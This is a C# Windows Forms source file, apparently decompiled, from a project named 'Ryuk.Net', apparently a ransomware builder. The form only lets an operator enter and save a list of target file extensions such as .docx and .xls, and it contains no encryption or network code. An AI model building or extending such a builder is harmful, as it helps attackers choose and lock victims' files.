namespace Ryuk.Net
{
    using CustomWindowsForm;
    using Ryuk.Net.Properties;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class extensions : Form
    {
        private bool mouseDown;
        private Point lastLocation;
        private IContainer components = null;
        private Panel panel1;
        private ButtonZ _CloseButton;
        private TextBox textBox1;
        private Button button1;
        private Label label1;

        public extensions()
        {
            this.InitializeComponent();
        }

        private void _CloseButton_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Settings.Default.extensions = this.textBox1.Text;
            MessageBox.Show("Saved successfully");
        }

        protected override void Dispose(bool disposing)
        {
            if (!(!disposing || ReferenceEquals(this.components, null)))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void extensions_Load(object sender, EventArgs e)
        {
            this.textBox1.Text = Settings.Default.extensions;
        }

        private void extensions_MouseDown(object sender, MouseEventArgs e)
        {
            this.mouseDown = true;
            this.lastLocation = e.Location;
        }

        private void extensions_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.mouseDown)
            {
                base.Location = new Point((base.Location.X - this.lastLocation.X) + e.X, (base.Location.Y - this.lastLocation.Y) + e.Y);
                base.Update();
            }
        }

        private void extensions_MouseUp(object sender, MouseEventArgs e)
        {
            this.mouseDown = false;
        }

        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(extensions));
            this.panel1 = new Panel();
            this.label1 = new Label();
            this.button1 = new Button();
            this.textBox1 = new TextBox();
            this._CloseButton = new ButtonZ();
            this.panel1.SuspendLayout();
            base.SuspendLayout();
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.button1);
            this.panel1.Controls.Add(this.textBox1);
            this.panel1.Controls.Add(this._CloseButton);
            this.panel1.Location = new Point(3, 2);
            this.panel1.Name = "panel1";
            this.panel1.Size = new Size(0x284, 0x23f);
            this.panel1.TabIndex = 2;
            this.panel1.MouseDown += new MouseEventHandler(this.panel1_MouseDown);
            this.panel1.MouseMove += new MouseEventHandler(this.panel1_MouseMove);
            this.panel1.MouseUp += new MouseEventHandler(this.panel1_MouseUp);
            this.label1.AutoSize = true;
            this.label1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this.label1.ForeColor = Color.White;
            this.label1.Location = new Point(0x19, 20);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x1f8, 20);
            this.label1.TabIndex = 4;
            this.label1.Text = "Add your extensions like this    \".docx\",\".txt\",\".jpg\",\".png\",\".xls\"";
            this.button1.BackColor = Color.FromArgb(30, 30, 30);
            this.button1.Cursor = Cursors.Hand;
            this.button1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this.button1.ForeColor = SystemColors.ControlLightLight;
            this.button1.Location = new Point(90, 0x210);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x1ab, 0x22);
            this.button1.TabIndex = 3;
            this.button1.Text = "SAVE";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.textBox1.BackColor = Color.FromArgb(30, 30, 30);
            this.textBox1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.textBox1.ForeColor = Color.White;
            this.textBox1.Location = new Point(0x13, 0x34);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x261, 0x1cb);
            this.textBox1.TabIndex = 2;
            this.textBox1.Text = manager.GetString("textBox1.Text");
            this._CloseButton.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this._CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
            this._CloseButton.DisplayText = "X";
            this._CloseButton.FlatStyle = FlatStyle.Flat;
            this._CloseButton.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this._CloseButton.ForeColor = Color.White;
            this._CloseButton.Location = new Point(0x265, 3);
            this._CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
            this._CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
            this._CloseButton.Name = "_CloseButton";
            this._CloseButton.Size = new Size(0x1f, 0x18);
            this._CloseButton.TabIndex = 1;
            this._CloseButton.Text = "X";
            this._CloseButton.TextLocation_X = 6;
            this._CloseButton.TextLocation_Y = 1;
            this._CloseButton.UseVisualStyleBackColor = true;
            this._CloseButton.Click += new EventHandler(this._CloseButton_Click);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.FromArgb(30, 30, 30);
            base.ClientSize = new Size(0x293, 0x24d);
            base.Controls.Add(this.panel1);
            base.FormBorderStyle = FormBorderStyle.None;
            base.Name = "extensions";
            base.ShowInTaskbar = false;
            base.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "extensions";
            base.Load += new EventHandler(this.extensions_Load);
            base.MouseDown += new MouseEventHandler(this.extensions_MouseDown);
            base.MouseMove += new MouseEventHandler(this.extensions_MouseMove);
            base.MouseUp += new MouseEventHandler(this.extensions_MouseUp);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            base.ResumeLayout(false);
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            this.mouseDown = true;
            this.lastLocation = e.Location;
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.mouseDown)
            {
                base.Location = new Point((base.Location.X - this.lastLocation.X) + e.X, (base.Location.Y - this.lastLocation.Y) + e.Y);
                base.Update();
            }
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            this.mouseDown = false;
        }
    }
}
